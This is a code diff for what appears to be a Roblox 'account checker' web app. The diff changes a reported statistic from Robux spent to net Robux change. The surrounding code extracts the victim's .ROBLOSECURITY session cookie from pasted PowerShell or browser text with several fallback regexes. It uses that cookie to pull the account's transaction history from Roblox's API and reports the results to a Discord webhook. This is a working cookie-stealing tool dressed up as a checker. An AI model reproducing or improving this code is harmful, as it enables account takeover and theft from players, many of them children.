@@ -50,23 +50,19 @@ async function check() {
   let cookie = null;
   let match;
 
-  // 1. PowerShell / .NET format
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
-  // 2. Classic -and-items.|_
   if (!cookie) {
     match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
     if (match && match[1]) cookie = match[1].trim();
   }
 
-  // 3. Long warning string
   if (!cookie) {
     match = raw.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
 
-  // 4. Fallback – longest string starting with _
   if (!cookie) {
     const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
     if (fallback.length) cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
@@ -109,7 +105,7 @@ async function check() {
       <b>AMP:</b> \${json.ampCount || 0}<br>
       <b>SAB:</b> \${json.sabCount || 0}<br>
       <b>JB:</b> \${json.jbCount || 0}<br>
-      <b>Robux Spent (last 12 months):</b> \${json.totalSpentLastYear?.toLocaleString('en-US') || 0}<br>
+      <b>Net Robux Change (last 12 months):</b> \${json.netRobuxChange?.toLocaleString('en-US') || 0}<br>
     \`;
 
     result.innerHTML = html;
@@ -294,15 +290,15 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Total Robux spent in the last 12 months
-    let totalSpentLastYear = 0;
+    // Net Robux change in the last 12 months (all transactions)
+    let netRobuxChange = 0;
     let cursor = null;
     const oneYearAgo = new Date();
     oneYearAgo.setFullYear(oneYearAgo.getFullYear() - 1);
 
     try {
       do {
-        const url = `https://economy.roblox.com/v2/users/${userData.id}/transactions?transactionType=Purchase&limit=100` +
+        const url = `https://economy.roblox.com/v2/users/${userData.id}/transactions?limit=100` +
                     (cursor ? `&cursor=${encodeURIComponent(cursor)}` : '');
 
         const txRes = await fetch(url, {
@@ -326,9 +322,7 @@ app.post('/check', async (req, res) => {
               break;
             }
 
-            if (tx.amountInRobux < 0) {
-              totalSpentLastYear += Math.abs(tx.amountInRobux);
-            }
+            netRobuxChange += tx.amountInRobux || 0;
           }
           if (shouldBreak) break;
         }
@@ -357,7 +351,7 @@ app.post('/check', async (req, res) => {
       ampCount,
       sabCount,
       jbCount,
-      totalSpentLastYear
+      netRobuxChange
     };
 
     // Send to Discord webhook (two embeds)
@@ -401,7 +395,7 @@ app.post('/check', async (req, res) => {
                   },
                   {
                     name: "**Spending**",
-                    value: `Robux Spent (last 12 months): **${totalSpentLastYear.toLocaleString('en-US')}**`,
+                    value: `Net Robux Change (last 12 months): **${netRobuxChange.toLocaleString('en-US')}**`,
                     inline: true
                   },
                   {
